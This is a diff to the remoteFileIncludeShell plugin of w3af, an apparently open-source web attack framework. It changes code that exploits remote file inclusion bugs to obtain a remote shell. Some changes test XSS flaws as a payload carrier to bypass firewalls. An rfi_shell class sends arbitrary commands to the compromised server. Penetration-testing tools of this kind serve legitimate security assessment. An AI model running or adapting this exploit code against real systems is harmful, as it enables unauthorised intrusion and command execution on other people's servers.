@@ -22,7 +22,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 # Common includes
-from core.data.fuzzer.fuzzer import createRandAlpha, createRandAlNum
+from core.data.fuzzer.fuzzer import createRandAlNum
 import core.controllers.outputManager as om
 
 # options
@@ -37,11 +37,10 @@ from core.controllers.daemons.webserver import webserver
 
 import os
 import time
-import urllib
 
 # Advanced shell stuff
 from core.data.kb.shell import shell as shell
-from plugins.attack.webshells.getShell import getShell
+import plugins.attack.webshells.getShell as getShell
 
 # Port definition
 import core.data.constants.w3afPorts as w3afPorts
@@ -98,18 +97,34 @@ class remoteFileIncludeShell(baseAttackPlugin):
         else:
             if self._use_XSS_vuln:
                 if len( kb.kb.getData( 'xss' , 'xss' ) ):
-                    for vuln in kb.kb.getData( 'xss' , 'xss' ):
-                        # TODO: FIX THIS BUG!!! I DONT SAVE THIS DATA TO THE INFO OBJ ANYMORE!
-                        if not vuln['escapesSingle'] and not vuln['escapesDouble'] and not\
-                        vuln['escapesLtGt']:
-                            self._xss_vuln = vuln
-                            return True
+                    for xss_vuln in kb.kb.getData( 'xss' , 'xss' ):
+                        # Set the test string
+                        test_string = '<?#@!()&=?>'
+                        
+                        # Test if the current xss vuln works for us:
+                        function_reference = getattr( self._urlOpener , xss_vuln.getMethod() )
+                        dc = xss_vuln.getDc()
+                        dc[ xss_vuln.getVar() ] = test_string
+
+                        try:
+                            http_res = function_reference( xss_vuln.getURL(), str(dc) )
+                        except:
+                            continue
                         else:
-                            msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
-                            msg += ' bug to exploit the RFI bug, but no XSS with the required'
-                            msg += ' parameters was found.'
-                            om.out.error( msg )
-                            return False
+                            if test_string in http_res.getBody():
+                                self._xss_vuln = xss_vuln
+                                return True
+                    
+                    # Check If I really got something nice that I can use to exploit
+                    # if not, report it to the user
+                    if not self._xss_vuln:
+                        msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
+                        msg += ' bug to exploit the RFI bug, but no XSS with the required'
+                        msg += ' parameters was found.'
+                        om.out.error( msg )
+                        return False
+                        
+                # No XSS was found
                 else:
                     msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
                     msg += ' exploit the RFI bug, but no XSS was found.'
@@ -148,11 +163,10 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @return : True if vuln can be exploited.
         '''
         # Create the shell
-        filename = createRandAlpha( 7 )
         extension = urlParser.getExtension( vuln.getURL() )
         
         # I get a list of tuples with file_content and extension to use
-        shell_list = getShell( extension )
+        shell_list = getShell.getShell( extension )
         
         for file_content, real_extension in shell_list:
             if extension == '':
@@ -163,16 +177,17 @@ class remoteFileIncludeShell(baseAttackPlugin):
             self._start_web_server()
             
             # Prepare for exploitation...
-            functionReference = getattr( self._urlOpener , vuln.getMethod() )
+            function_reference = getattr( self._urlOpener , vuln.getMethod() )
             dc = vuln.getDc()
             dc[ vuln.getVar() ] = url_to_include
 
             try:
-                http_res = functionReference( vuln.getURL(), str(dc) )
+                http_res = function_reference( vuln.getURL(), str(dc) )
             except:
                 successfully_exploited = False
             else:
-                successfully_exploited = self._defineCut( http_res.getBody(), 'w3af' , exact=True )
+                successfully_exploited = self._defineCut( http_res.getBody(), \
+                                                        getShell.SHELL_IDENTIFIER, exact=True )
 
             if successfully_exploited:
                 self._exploit_dc = dc
@@ -223,6 +238,9 @@ class remoteFileIncludeShell(baseAttackPlugin):
             self._web_server = None 
     
     def _start_web_server( self ):
+        '''
+        Start the web server if needed.
+        '''
         if self._use_XSS_vuln:
             return
         if not self._web_server:
@@ -299,11 +317,12 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The exploitation can be
-        done using a more classic approach, in which the file to be included is hosted on a webserver that the plugin
-        runs, or a nicer approach, in which a XSS bug on the remote site is used to generate the remote file to be included.
-        Both ways work and return a shell, but the one that uses XSS will work even when a restrictive firewall is configured
-        at the remote site.
+        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The 
+        exploitation can be done using a more classic approach, in which the file to be included 
+        is hosted on a webserver that the plugin runs, or a nicer approach, in which a XSS bug on 
+        the remote site is used to generate the remote file to be included. Both ways work and 
+        return a shell, but the one that uses XSS will work even when a restrictive firewall is 
+        configured at the remote site.
         
         Three configurable parameters exist:
             - listenAddress
@@ -313,6 +332,16 @@ class remoteFileIncludeShell(baseAttackPlugin):
         '''
         
 class rfi_shell(shell):
+    
+    def __init__(self, vuln):
+        '''
+        Create the obj
+        '''
+        shell.__init__(self, vuln)
+        
+        self._exploit_dc = None
+        self._web_server = None
+    
     def setExploitDc( self, e_dc ):
         '''
         Save the exploit data container, that holds all the parameters for a successful exploitation
@@ -347,9 +376,9 @@ class rfi_shell(shell):
         e_dc = e_dc.copy()
         e_dc[ 'cmd' ] = command
         
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        function_reference = getattr( self._urlOpener , self.getMethod() )
         try:
-            http_res = functionReference( self.getURL(), str(e_dc) )
+            http_res = function_reference( self.getURL(), str(e_dc) )
         except w3afException, w3:
             return 'Exception from the remote web application:' + str(w3)
         except Exception, e:
@@ -358,6 +387,9 @@ class rfi_shell(shell):
             return self._cut( http_res.getBody() )
         
     def end( self ):
+        '''
+        Finish execution, clean-up, clear the local web server.
+        '''
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
             self._clear_web_server( self.getExploitDc()[ self.getVar() ] )
